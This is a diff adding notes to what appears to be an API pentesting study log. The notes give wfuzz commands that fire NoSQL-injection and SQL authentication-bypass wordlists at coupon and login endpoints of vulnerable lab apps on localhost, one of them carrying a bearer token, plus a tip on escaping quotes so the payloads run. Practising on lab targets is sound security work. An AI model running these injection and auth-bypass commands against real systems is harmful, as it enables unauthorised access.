@@ -124,3 +124,13 @@ Windows
 5. using wfuzz to automate the testing -
    
         wfuzz -z file,/usr/share/wordlists/PayloadsAllTheThings/NoSQL\ Injection/Intruder/NoSQL.txt -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0ZXJAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcxMjQ3NDYzMCwiZXhwIjoxNzEzMDc5NDMwfQ.pY1PF5wW0wXFYde1kJIGLlrzjTGD_IMmrj2CTr3S_XDEp0myEiPrZNAZbD62RP21iw00ZofwkhauW7I6fm54pbnXKvhG7sOBCFIigsx6virBSiMpNBz8rnWCciWZCyEUL6Gh2qXZZkitLue62m4lBipyrsuqHCFMJjglgg2kDWcae4gC_9pLxcG6gmpmzJwD6qPTUMD7aOdQqJEFfqaSj-nMxL_0WeIXjY_CgJ5loJHIiDAzZC4YsHpQhXf5zQUIM6q0g8Xee3KfhWppboqKVkc0wY_FJgxxD_GthHG3ix5l1ekJSF99mDDz7Iy8Hs4CnS2rlx4_HgZ8yrNvndmo8g" -d "{\"coupon_code\":FUZZ}" --sc 200 -p localhost:8080 http://localhost:8888/community/api/v2/coupon/validate-coupon
+
+
+## Note
+1. Look at how the payload is getting succeeded in execution. 
+     
+        wfuzz -z file,test -H "Content-Type: application/json" -d "{\"username\":\"FUZZ\",\"password\":\"password\"}" -p localhost:8080 http://localhost/vapi/api8/user/login
+
+2. Check for " marks and escape them accordingly to get right results
+
+        wfuzz -z file,/usr/share/wordlists/PayloadsAllTheThings/SQL\ Injection/Intruder/Auth_Bypass.txt -H "Content-Type: application/json" -d "{\"username\":\"FUZZ\",\"password\":\"password\"}" --sc 200  http://localhost/vapi/api8/user/login
